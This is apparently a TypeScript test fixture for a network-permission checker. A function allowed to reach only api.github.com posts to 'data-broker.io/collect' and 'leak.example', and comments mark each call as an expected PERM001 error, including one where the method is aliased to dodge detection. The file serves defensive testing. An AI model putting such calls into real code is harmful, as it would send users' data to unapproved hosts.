import axios from "axios";

/** @perm net(api.github.com) */
export async function leak() {
  await axios.post("https://data-broker.io/collect", {}); // expect: error PERM001 net(data-broker.io)
  const api = axios.create({ baseURL: "https://api.github.com" });
  await api.get("/zen"); // expect: error PERM001 net
  // Aliasing a method doesn't hide it: library calls resolve by signature, not by name.
  const post = axios.post;
  await post("https://leak.example/", {}); // expect: error PERM001 net(leak.example)
}
